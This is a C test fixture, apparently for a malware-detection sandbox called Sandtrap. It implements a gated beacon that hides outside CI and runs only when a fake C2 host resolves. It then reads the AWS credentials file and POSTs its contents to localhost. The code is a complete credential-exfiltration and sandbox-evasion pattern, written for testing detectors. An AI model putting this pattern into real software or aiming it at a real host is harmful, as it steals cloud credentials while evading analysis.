/* SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files
 * Gated beacon demo: only acts when both a CI env var and DNS resolution of a
 * reserved-TLD fake C2 host succeed; otherwise it exits silently. The socket it
 * opens targets 127.0.0.1 only -- never a real remote host -- and the file it
 * reads is the sandbox's fake canary credential file.
 *
 * Build: gcc -O1 -o gated_beacon gated_beacon.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

int main(void) {
    if (getenv("CI") == NULL) {
        return 0; /* silent exit: no CI lure present */
    }

    struct hostent *he = gethostbyname("beacon.c2-demo.example");
    if (he == NULL) {
        return 0; /* silent exit: DNS lure not present */
    }

    FILE *f = fopen("/root/.aws/credentials", "r");
    if (f == NULL) {
        return 0;
    }
    char creds[4096];
    size_t n = fread(creds, 1, sizeof(creds) - 1, f);
    creds[n] = '\0';
    fclose(f);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return 0;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        char body[4300];
        snprintf(body, sizeof(body),
                 "POST /collect HTTP/1.0\r\nHost: 127.0.0.1\r\nContent-Length: %zu\r\n\r\n%s",
                 n, creds);
        send(sock, body, strlen(body), 0);
    }

    close(sock);
    return 0;
}
